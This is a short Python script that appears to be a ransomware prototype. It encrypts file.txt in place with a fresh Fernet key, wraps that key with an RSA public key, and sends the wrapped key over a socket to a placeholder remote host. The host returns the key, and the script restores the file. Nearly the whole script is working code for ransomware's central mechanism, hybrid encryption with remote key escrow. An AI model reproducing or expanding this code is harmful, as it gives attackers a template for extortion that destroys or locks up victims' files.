from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.fernet import Fernet

import socket

def sendkey(binkey):
    HOST='xxx.xxx.xxx.xxxx'
    PORT=8000

    s=socket.socket()
    s.connect((HOST,PORT))

    s.send(binkey)
    data=s.recv(2048)
    FernetInstance=Fernet(data)

    with open('decryptedkey','wb') as file:
        file.write(data)
    
    
    with open('file.txt','rb') as file:
        cipher_text=file.read()
        plaintext=FernetInstance.decrypt(cipher_text)
    
    with open('plaintext.txt','wb') as file:
        file.write(plaintext)
    pass
    

symetrickey=Fernet.generate_key()

FernetInstance=Fernet(symetrickey) # the fernet module provide a api to symmetric key cryptography

with open('public.pem','rb') as keyfile:#  with keyword an alternative to try finally when openning a file
    public_key=serialization.load_pem_public_key(
        keyfile.read(),
        backend=default_backend()
    )

encryptedSymetricKey=public_key.encrypt(
    symetrickey,
    padding.OAEP(# oap depend on a cryptographyc hashe , here we use the sha256 hash function
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),#  hashing function used along with oaep
        label=None
    )
)

with open('encryptedSymetricKey.key','wb') as key_file:# we write the encrypted key to file
    key_file.write(encryptedSymetricKey)


filePath='file.txt'

with open(filePath,'rb') as file:
    file_data=file.read()
    encrypted_data=FernetInstance.encrypt(file_data)#  we encrypt the file containing the cryptographic key

with open(filePath,'wb') as file:
    file.write(encrypted_data)


#send the encrypted 
with open('encryptedSymetricKey.key','rb') as file:
    encrypted_key=file.read()

sendkey(encrypted_key)

quit()
